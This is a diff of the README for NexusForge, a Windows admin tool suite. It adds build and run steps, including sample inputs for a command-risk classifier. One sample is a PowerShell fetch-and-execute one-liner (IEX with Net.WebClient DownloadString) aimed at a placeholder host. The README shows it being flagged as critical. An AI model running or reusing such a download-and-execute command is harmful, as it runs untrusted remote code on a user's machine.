@@ -1,6 +1,130 @@
-NexusForge
+# NexusForge
 
-Build. Diagnose. Automate. Resolve.
+
+
+
+
+# **to run:**
+
+###### **Clone this repository on your system.** 
+
+&#x09;**git clone https://github.com/TheJ4nitorNG/NexusForge.git**
+
+
+
+**run build\_release.bat**
+
+&#x09;build\_release.bat will create all 3 .exe files 
+
+
+
+&#x20; Part 1: Running SysMedic (The Diagnostics Engine)
+
+
+
+&#x20; How it works:
+
+&#x20; SysMedic loads the DiagnosticCoordinator, which runs your system health checks concurrently.
+
+&#x20; Right now, it runs two real, non-mocked Windows diagnostics:
+
+&#x20;  1. windows.storage.freespace (LogicalDiskSpaceCheck): Queries your local physical drives. It calculates free
+
+&#x20;     percentages. It will trigger warnings if < 15% free space, and critical alerts if < 5%.
+
+&#x20;  2. windows.services.critical (CriticalServicesCheck): Queries the real Windows Service Controller (ServiceController)
+
+&#x20;     to check if critical OS system services (like WMI Winmgmt, RPC RpcSs, and EventLog) are running.
+
+
+
+&#x20; How to run it:
+
+&#x20; In your second terminal, run this command to start a full system scan:
+
+
+
+&#x20;  1 dotnet run --project src\\Products\\SysMedic\\SysMedic.Cli\\SysMedic.Cli.csproj -- scan
+
+
+
+&#x20; What you will see:
+
+&#x20; An animated status loader as it runs, followed by a beautiful formatted Spectre.Console table containing the overall
+
+&#x20; health score (0-100), passing/failing checks, and a list of actionable findings with recovery recommendations if any
+
+&#x20; drives are full or services are stopped.
+
+
+
+&#x20; ---
+
+
+
+&#x20; Part 2: Running CMDPilot (The AI/Risk Classifier Engine)
+
+
+
+&#x20; How it works:
+
+&#x20; CMDPilot's RiskEngine accepts proposed shell commands and analyzes their safety before they execute. It uses the
+
+&#x20; PowerShellAstAnalyzer to detect string obfuscation, extract called cmdlets from the AST (Abstract Syntax Tree), and
+
+&#x20; evaluate risks.
+
+&#x20; It will classify commands dynamically based on privilege requirements, destructive patterns, and known safe commands.
+
+
+
+&#x20; How to run it (Try these 3 different profiles):
+
+
+
+&#x20;  1. Test a Safe Command (Read-Only Process Retrieval):
+
+
+
+&#x20;  1     dotnet run --project src\\Products\\CMDPilot\\CMDPilot.Cli\\CMDPilot.Cli.csproj -- analyze "Get-Process |
+
+&#x20;    Where-Object { \\$\_.CPU -gt 10 } | Select-Object ProcessName, CPU"
+
+&#x20;     Result: It will identify this as SAFE (Green) because it uses known, read-only PowerShell commands.
+
+
+
+&#x20;  2. Test an Unverified/Custom Script:
+
+
+
+&#x20;  1     dotnet run --project src\\Products\\CMDPilot\\CMDPilot.Cli\\CMDPilot.Cli.csproj -- analyze "Invoke-CustomDeploy
+
+&#x20;    -Target 'ProdServer'"
+
+&#x20;     Result: It will classify this as HIGH RISK (Orange) because the engine does not recognize Invoke-CustomDeploy as a
+
+&#x20; verified safe command, prompting a warning about running unverified instructions.
+
+
+
+&#x20;  3. Test a Critical Risk (Obfuscated String Injection):
+
+
+
+&#x20;  1     dotnet run --project src\\Products\\CMDPilot\\CMDPilot.Cli\\CMDPilot.Cli.csproj -- analyze "IEX (New-Object
+
+&#x20;    Net.WebClient).DownloadString('http://dangerous-payload.com')"
+
+&#x20;     Result: It will flag this instantly as CRITICAL RISK (Red) because it detects runtime invocation (IEX /
+
+&#x20; Invoke-Expression) and network download indicators, printing a strong security block warning.
+
+
+
+#### Build. Diagnose. Automate. Resolve.
+
+
 
 NexusForge is a modular ecosystem of professional Windows tools built for system administrators, IT professionals, developers, power users, and incident responders.
 
@@ -18,7 +142,9 @@ Rather than creating a collection of unrelated utilities, NexusForge provides a 
 
 
 
-The NexusForge Suite
+#### The NexusForge Suite
+
+
 
 Product	Purpose	Status
 
@@ -36,7 +162,9 @@ Additional tools will be added as the platform evolves.
 
 
 
-Why NexusForge?
+#### Why NexusForge?
+
+
 
 Windows administrators and power users often rely on a fragmented collection of:
 
@@ -62,11 +190,11 @@ NexusForge aims to bring these capabilities together without turning them into o
 
 
 
-Each tool has a specific purpose.
+###### *Each tool has a specific purpose.*
 
+###### 
 
-
-Each tool can stand on its own.
+###### *Each tool can stand on its own.*
 
 
 
@@ -74,9 +202,13 @@ And when multiple tools are used together, they can share information and capabi
 
 
 
-Core Principles
+## Core Principles:
 
-1\. Useful Over Flashy
+
+
+###### 1\. Useful Over Flashy:
+
+
 
 Every feature should solve a real problem.
 
@@ -86,7 +218,9 @@ We are not interested in adding features simply because they look impressive on 
 
 
 
-2\. Transparency Over Fear
+##### 2\. Transparency Over Fear
+
+
 
 NexusForge tools should tell users what they are doing and why.
 
@@ -118,7 +252,9 @@ If we don't know, say that too.
 
 
 
-3\. Safe by Default
+##### 3\. Safe by Default
+
+
 
 Administrative software has the potential to cause serious damage when poorly designed.
 
@@ -156,15 +292,15 @@ Where appropriate, NexusForge tools provide both:
 
 
 
-Interactive Mode
+###### Interactive Mode
 
 &#x20;       +
 
-CLI / PowerShell Automation
+###### CLI / PowerShell Automation
 
 &#x20;       +
 
-Structured Output
+###### Structured Output
 
 
 
@@ -172,7 +308,9 @@ This allows the same capability to serve both an individual user and an experien
 
 
 
-5\. Modular Architecture
+##### 5\. Modular Architecture
+
+
 
 Shared functionality should live in reusable libraries rather than being duplicated across applications.
 
@@ -218,9 +356,11 @@ The actual dependency graph will remain intentionally more restrictive than the 
 
 
 
-Architecture
+##### Architecture:
 
-NexusForge is designed as a layered ecosystem.
+
+
+###### NexusForge is designed as a layered ecosystem.
 
 
 
@@ -270,13 +410,17 @@ NexusForge is designed as a layered ecosystem.
 
 
 
-Technology
+###### **Technology:**
+
+
 
 The initial platform is designed primarily around the Microsoft ecosystem.
 
 
 
-Primary Stack
+##### Primary Stack:
+
+
 
 C#
 
@@ -300,7 +444,7 @@ Recommended:
 
 
 
-Windows 11
+###### **Windows 11**
 
 Visual Studio 2026 or compatible .NET development environment
 
@@ -404,9 +548,13 @@ The structure may evolve as implementation progresses.
 
 
 
-Products
+#### Products:
 
-CMDPilot
+
+
+###### **CMDPilot:**
+
+
 
 Intelligent command-line assistance for Windows.
 
@@ -442,7 +590,9 @@ CMDPilot is intended to assist the administratorâ€”not blindly execute commands 
 
 
 
-SysMedic
+###### **SysMedic:**
+
+
 
 Windows system diagnostics and troubleshooting.
 
@@ -492,7 +642,9 @@ into:
 
 
 
-IncidentKit
+###### **IncidentKit:**
+
+
 
 Incident response and technical investigation toolkit.
 
@@ -532,7 +684,9 @@ Evidence handling will prioritize reproducibility and integrity.
 
 
 
-CleanSlate
+###### **CleanSlate:**
+
+
 
 Storage intelligence and cleanup.
 
@@ -572,7 +726,9 @@ CleanSlate intentionally avoids the misleading behavior common in traditional â€
 
 
 
-Shared Platform
+###### **Shared Platform -**
+
+
 
 The applications will share common infrastructure where doing so improves consistency and reliability.
 
@@ -720,7 +876,9 @@ The exact command surface will be finalized during implementation.
 
 
 
-Security
+##### **Security:**
+
+
 
 Security is a core engineering requirement rather than an afterthought.
 
@@ -800,7 +958,9 @@ Local functionality should remain useful without telemetry.
 
 
 
-Testing
+###### **Testing:**
+
+
 
 Reliability is especially important for administrative tools.
 
@@ -860,7 +1020,9 @@ Testing complete user workflows.
 
 
 
-CI/CD
+###### **CI/CD:**
+
+
 
 GitHub Actions will eventually provide automated:
 
@@ -898,7 +1060,9 @@ Pull requests should not be merged when required checks are failing.
 
 
 
-Versioning
+###### **Versioning:**
+
+
 
 NexusForge will use semantic versioning where appropriate:
 
@@ -1094,7 +1258,9 @@ More detailed contribution guidelines will be added as the project matures.
 
 
 
-License
+###### **License:**
+
+
 
 The licensing model for NexusForge and its individual products is currently under development.
 
